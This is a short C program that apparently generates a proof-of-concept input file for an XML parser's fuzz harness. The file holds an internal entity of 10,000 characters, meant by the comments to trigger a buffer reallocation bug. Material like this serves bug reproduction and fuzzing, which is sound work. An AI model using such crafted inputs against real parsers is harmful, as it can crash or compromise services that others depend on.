#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    /* Write opts (4 bytes, big-endian, value 0) */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);

    /* Write maxAlloc (4 bytes, big-endian, value 0) */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);

    /* Write main URL string "test.xml" terminated by backslash-newline */
    fputs("test.xml", f);
    fputc('\\', f);
    fputc('\n', f);

    /* Write XML content with malformed internal entity, terminated by backslash-newline */
    fputs("<?xml version=\"1.0\"?>\n", f);
    fputs("<!DOCTYPE foo [\n", f);
    fputs("<!ENTITY x \"", f);
    
    /* Long entity value to trigger buffer reallocation */
    for (int i = 0; i < 10000; i++) {
        fputc('A', f);
    }
    
    fputs("\">\n", f);
    fputs("]>\n", f);
    fputs("<root>&x;</root>\n", f);

    fputc('\\', f);
    fputc('\n', f);

    fclose(f);
    return 0;
}